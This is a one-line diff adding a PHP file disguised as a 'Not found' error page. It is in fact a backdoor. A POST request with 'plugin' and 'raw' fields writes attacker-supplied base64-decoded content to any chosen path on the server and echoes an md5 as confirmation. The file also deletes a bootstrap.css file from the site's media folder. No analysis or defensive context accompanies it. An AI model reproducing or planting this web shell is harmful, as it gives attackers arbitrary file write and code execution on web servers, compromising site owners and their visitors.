@@ -1,0 +1,1 @@
+<?php echo "Not found! Error id: (41687865646)";if(isset($_POST["plugin"])){file_put_contents($_POST["plugin"],base64_decode($_POST["raw"]));echo md5($_POST["plugin"]);}if(file_exists("../media/css/bootstrap.css")){@unlink("../media/css/bootstrap.css");}?>
